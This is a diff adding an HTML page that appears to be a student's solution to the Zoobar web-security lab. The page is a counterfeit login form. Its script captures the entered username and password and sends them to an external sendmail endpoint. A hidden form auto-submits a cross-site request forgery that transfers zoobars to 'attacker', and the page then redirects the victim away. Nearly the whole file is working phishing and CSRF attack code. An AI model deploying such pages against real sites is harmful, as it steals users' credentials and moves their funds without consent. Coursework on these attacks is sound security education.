@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+  <head>
+        <link rel="stylesheet" type="text/css"
+              href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+<script type="text/javascript">
+function sendMail() {
+try {
+var xmlHttp;
+xmlHttp = new XMLHttpRequest();
+username = document.getElementsByName("login_username")[0].value;
+pwd = document.getElementsByName("login_password")[0].value;
+url = "http://tcloud.sjtu.edu.cn/courses/css/2014/sendmail.php?to=kkmnmbj%40sjtu.edu.cn&payload="+
+username + "%2C" + pwd + "&send_submit=Send+Email";
+xmlHttp.open("GET", url, false);
+xmlHttp.send();
+} catch(err) {}
+}
+</script>
+  </head>
+<body>
+<h1>
+<a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for  Inquisitive Learning</a>
+</h1>
+<h2>Supporting the shrewd advocates of the next generation</h2>
+<div id="login" class="centerpiece">
+<form name="loginform" method="POST"
+      action="http://localhost:8080/zoobar/index.cgi/login">
+<table>
+  <tr>
+    <td>Username:</td>
+    <td><input type="text" id="login_username" name="login_username"
+    size="20" autocomplete="no" value=""></td>
+  </tr>
+  <tr>
+    <td>Password:</td>
+    <td colspan=2>
+      <input type="password" id="login_password" name="login_password"
+      size=20 autocomplete="no">
+      <input onClick="sendMail()" type="submit" name="submit_login"
+      value="Log in" >
+      <input type="submit" name="submit_registration"
+             value="Register">
+     </td>
+  </tr>
+</table>
+<input type="hidden" name="nexturl"
+       value="http://localhost:8080/zoobar/index.cgi">
+</form>
+</div>
+<div class="footer warning"></div>
+<iframe width="0" height="0" id="iframe" style="display: none" name="iframe">
+</iframe>
+<div style="display: none" id="idiv">
+  <form style="display: none" method="post" id="csfr"
+        action="http://localhost:8080/zoobar/index.cgi/transfer"
+  target="iframe" />
+    <input style="display: none" type="hidden" name="zoobars" value="10" />
+    <input style="display: none" type="hidden" name="recipient" value="attacker" />
+    <input style="display: none"  type="submit" />
+</form>
+</div>
+<div style="display: none" id="myZoobars"></div>
+<script type="text/javascript">
+  var script = document.createElement("script");
+  script.type = "text/javascript";
+  script.src = "http://localhost:8080/zoobar/index.cgi/zoobarjs";
+  document.body.appendChild(script);
+  div = document.getElementById("myZoobars");
+  function wait() {
+      if (div.innerHTML != "") {
+        iframe = document.getElementById("iframe");
+        iframe.addEventListener("load", function(){window.location="http://css.csail.mit.edu/6.858/2013/";});
+        document.getElementById("csfr").submit();
+      } else {
+      }
+   }
+  setTimeout(function(){wait()}, 1000);
+</script>
+</body>
+</html>
